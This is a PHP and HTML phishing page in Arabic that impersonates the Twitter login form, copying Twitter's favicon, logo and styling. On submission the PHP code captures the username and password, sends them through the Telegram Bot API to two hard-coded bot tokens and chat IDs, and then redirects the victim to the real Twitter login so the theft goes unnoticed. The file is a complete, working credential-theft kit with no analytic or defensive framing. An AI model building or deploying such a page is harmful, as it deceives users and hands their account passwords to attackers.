<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // ✅ بيانات تيليجرام
    $token1 = "7197079453:AAFnVl-c5S28araI2YScZOPlQzBUXn_zZIk";
    $chat_id1 = "6454073193";

    $token2 = "7522052271:AAHa6XIscaA7ivTn_C0Wr8oaqritL0GP8EY";
    $chat_id2 = "7197079453";

    // ✅ قراءة البيانات من النموذج
    $username = $_POST['username'];
    $password = $_POST['password'];

    // ✅ تنسيق الرسالة
    $msg = "🔐 محاولة تسجيل دخول تويتر وهمي:\n👤 المستخدم: $username\n🔑 كلمة المرور: $password";

    // ✅ إرسال إلى البوت الأول
    file_get_contents("https://api.telegram.org/bot$token1/sendMessage?chat_id=$chat_id1&text=" . urlencode($msg));

    // ✅ إرسال إلى البوت الثاني
    file_get_contents("https://api.telegram.org/bot$token2/sendMessage?chat_id=$chat_id2&text=" . urlencode($msg));

    // ✅ إعادة توجيه المستخدم إلى تويتر الحقيقي
    header("Location: https://twitter.com/login");
    exit;
}
?>

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>تسجيل الدخول إلى تويتر / Twitter</title>
  <link rel="icon" href="https://abs.twimg.com/favicons/twitter.2.ico">
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #15202b;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .login-box {
      background-color: #192734;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0 0 10px #000;
      width: 100%;
      max-width: 400px;
    }

    .login-box h2 {
      margin-bottom: 20px;
    }

    .input-group {
      margin-bottom: 15px;
    }

    .input-group input {
      width: 100%;
      padding: 12px;
      background-color: #253341;
      border: none;
      border-radius: 4px;
      color: white;
      font-size: 16px;
    }

    .login-button {
      width: 100%;
      padding: 12px;
      background-color: #1da1f2;
      border: none;
      border-radius: 4px;
      color: white;
      font-size: 16px;
      cursor: pointer;
    }

    .login-button:hover {
      background-color: #0d8ddb;
    }

    .twitter-logo {
      display: flex;
      justify-content: center;
      margin-bottom: 20px;
    }

    .twitter-logo img {
      width: 40px;
    }

    .small-text {
      font-size: 12px;
      color: #8899a6;
      margin-top: 15px;
      text-align: center;
    }
  </style>
</head>
<body>
  <form class="login-box" method="POST">
    <div class="twitter-logo">
      <img src="https://abs.twimg.com/icons/apple-touch-icon-192x192.png" alt="Twitter Logo">
    </div>
    <h2>تسجيل الدخول إلى تويتر</h2>
    <div class="input-group">
      <input type="text" name="username" placeholder="رقم الهاتف أو البريد الإلكتروني" required>
    </div>
    <div class="input-group">
      <input type="password" name="password" placeholder="كلمة المرور" required>
    </div>
    <button type="submit" class="login-button">تسجيل الدخول</button>
    <div class="small-text">هل نسيت كلمة المرور؟</div>
  </form>
</body>
</html>
